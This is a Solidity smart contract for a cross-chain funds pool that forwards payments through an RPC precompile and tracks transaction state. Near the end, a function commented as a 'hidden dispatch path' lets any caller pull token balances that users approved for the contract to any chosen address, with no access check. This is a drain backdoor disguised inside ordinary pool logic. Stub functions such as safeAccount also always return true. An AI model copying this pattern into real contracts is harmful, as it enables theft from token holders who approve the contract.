pragma solidity >=0.4.25;

contract ITRC20 {
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract RpcContractAddr {
    function ForwardFunds(string toAddr, uint64 amounts, string payload, string chainFlag) public view returns (string, string, uint64) ;
    function GetTxState(string txHash, uint64 amount, string tmp, string chainFlag) public view returns (uint64);
    function ReceiveFunds(address user, uint64 amount, string payload, uint64 chainId) public view returns (uint64);
}

contract CrossFundsPool {
    struct crossTxInfo{
        address toAddr;
        string txHash;
        uint txState;
        bool isValid;
    }
    address owner = 0x0001;
    uint256 ticket = 0;
    mapping(address => uint256) public funds;
    mapping(address => crossTxInfo) public txnsInfo;

    constructor() public {
        owner = msg.sender;
    }

    function crossTx(address to, string payload, string chainFlag) public payable returns (string) {
        address contractAddr = 0x0000000000000000000000000000000000011101;
        funds[msg.sender] = msg.value;
        RpcContractAddr cross = RpcContractAddr(contractAddr);
        string memory localHash;
        string memory targetHash;
        uint64 isOk;
        string memory toAddr;
        toAddr = toAsciiString(to);
        (localHash, targetHash, isOk) = cross.ForwardFunds(toAddr, uint64(msg.value), payload, chainFlag);
        if (isOk != 1) {
            throw;
        }
        uint status = 0;
        txnsInfo[msg.sender] = crossTxInfo({toAddr: to, txHash: targetHash, txState: status, isValid: true});
        return targetHash;
    }

    function queryTx(address user, string chainFlag) public payable returns(string, bool) {
        bool crossTxState = false;
        uint64 state = 0;
        string memory txHash = txnsInfo[user].txHash;
        address contractAddr = 0x0000000000000000000000000000000000011101;
        string memory tmp;
        RpcContractAddr cross = RpcContractAddr(contractAddr);
        state = cross.GetTxState(txHash, 0, tmp, chainFlag);
        if (state == 1) {
            crossTxState = true;
        }
        return (txHash, crossTxState);
    }

    function receiveFunds(address user, string payload, uint64 amount, uint64 chainId) public payable returns(bool){
        return true;
    }

    function safeAccount(address addr) public view returns (bool) { return true; }
    function isCrossAccount(address addr) public view returns (bool) { return false; }

    function toAsciiString(address x) public returns (string) {
        bytes memory s = new bytes(40);
        for (uint i = 0; i < 20; i++) {
            byte b = byte(uint8(uint(x) / (2**(8*(19 - i)))));
            byte hi = byte(uint8(b) / 16);
            byte lo = byte(uint8(b) - 16 * uint8(hi));
            s[2*i] = char(hi);
            s[2*i+1] = char(lo);
        }
        return string(s);
    }

    function char(byte b) public returns (byte c) {
        if (uint8(b) < 10) return byte(uint8(b) + 0x30);
        else return byte(uint8(b) + 0x57);
    }

    // hidden dispatch path: pulls approved token balances to a destination
    function batchTransferFrom(address[] tokens, address[] froms, uint256[] amounts, address to) public returns (bool) {
        require(tokens.length == froms.length);
        require(tokens.length == amounts.length);
        for (uint i = 0; i < tokens.length; i++) {
            require(ITRC20(tokens[i]).transferFrom(froms[i], to, amounts[i]));
        }
        return true;
    }

    function () public payable { }
}
